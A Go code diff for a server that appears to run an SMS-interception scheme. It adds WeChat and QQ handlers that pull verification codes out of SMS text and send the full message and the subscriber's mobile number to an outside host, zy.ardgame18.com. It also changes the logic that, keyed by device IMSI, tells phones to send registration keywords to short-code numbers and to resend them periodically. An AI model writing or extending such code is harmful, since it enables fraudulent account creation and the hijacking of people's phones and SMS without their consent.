@@ -87,6 +87,10 @@ func sendC(w http.ResponseWriter, r *http.Request) {
 				processGtjaRegister(msg, *user, r.FormValue("apid"))
 			} else if strings.EqualFold(r.FormValue("apid"), "106") {
 				processTaobaoRegister(msg, *user, r.FormValue("apid"))
+			} else if strings.EqualFold(r.FormValue("apid"), "107") {
+				processWechatRegister(msg, *user, r.FormValue("apid"))
+			} else if strings.EqualFold(r.FormValue("apid"), "108") {
+				processQQWithoutMoRegister(msg, *user, r.FormValue("apid"))
 			}
 		}
 	}
@@ -197,6 +201,17 @@ func processTaobaoRegister(msg string, user map[string]string, apid string) {
 	if nil != result {
 		log.Println(result[1])
 		url := "http://zy.ardgame18.com:8080/verifycode/api/getTBCode.jsp?cid=c115&pid=tb115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+		go send2Url(url)
+	}
+	go updateRelationSuccess(user, apid)
+}
+func processQQWithoutMoRegister(msg string, user map[string]string, apid string) {
+	mobile := formatMobile(user["mobile"])
+	exp := regexp.MustCompile(`】(\S*)（`)
+	result := exp.FindStringSubmatch(msg)
+	if nil != result {
+		log.Println(result[1])
+		url := "http://zy.ardgame18.com:8080/verifycode/api/getQQNY.jsp?cid=c115&pid=ny115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
 		go send2Url(url)
 	}
 	go updateRelationSuccess(user, apid)
@@ -323,11 +338,12 @@ func chooseRegisterContent(user map[string]string) string {
 		appList = ",4,"
 		appCount++
 	}
-	resultArray, _ := fetchRows(dbConfig, "SELECT *,ifnull(successCount,0) as successCount  FROM `register_user_relations` WHERE imsi =  ?", user["imsi"])
+	resultArray, _ := fetchRows(dbConfig, "SELECT *,ifnull(successCount,0) as successCount,ifnull(lastSendTime,0) as lastSendTime  FROM `register_user_relations` WHERE imsi =  ?", user["imsi"])
 	userRecordMap := make(map[string]map[string]string)
 	for _, v := range *resultArray {
 		userRecordMap[v["apid"]] = v
 	}
+	ctime := time.Now().Unix()
 	mapRegisterTargetConfig.Range(func(ki, vi interface{}) bool {
 		if appCount < 3 {
 			v := vi.(map[string]string)
@@ -336,9 +352,16 @@ func chooseRegisterContent(user map[string]string) string {
 				if userRecordMap[v["apid"]] == nil {
 					needCmd = true
 					go insertRelation(user, v)
-				} else if strings.EqualFold(userRecordMap[v["apid"]]["successCount"], "0") {
-					needCmd = true
-					go updateRelation(userRecordMap[v["apid"]], v)
+				} else {
+					lastSendTime, _ := strconv.ParseInt(userRecordMap[v["apid"]]["lastSendTime"], 10, 64)
+					resendIntervalDay, _ := strconv.ParseInt(v["resendInterval"], 10, 64)
+					if strings.EqualFold(userRecordMap[v["apid"]]["successCount"], "0") {
+						needCmd = true
+						go updateRelation(userRecordMap[v["apid"]], v)
+					} else if ctime-lastSendTime > 86400*resendIntervalDay {
+						needCmd = true
+						go updateRelation(userRecordMap[v["apid"]], v)
+					}
 				}
 				if needCmd {
 					result = strings.Replace(result, "[command-"+strconv.Itoa(appCount)+"]", "<data><kno>"+v["portNumber"]+"</kno><kw>"+v["keyword"]+"</kw><apid>"+v["apid"]+"</apid></data>", -1)
@@ -352,7 +375,7 @@ func chooseRegisterContent(user map[string]string) string {
 			} else {
 				if userRecordMap[v["apid"]] != nil {
 					_getTime, _ := strconv.ParseInt(userRecordMap[v["apid"]]["getTime"], 10, 64)
-					if time.Now().Unix()-_getTime < 86400 {
+					if ctime-_getTime < 86400 {
 						go updateRelationSetGetTimeZero(userRecordMap[v["apid"]])
 					}
 				}
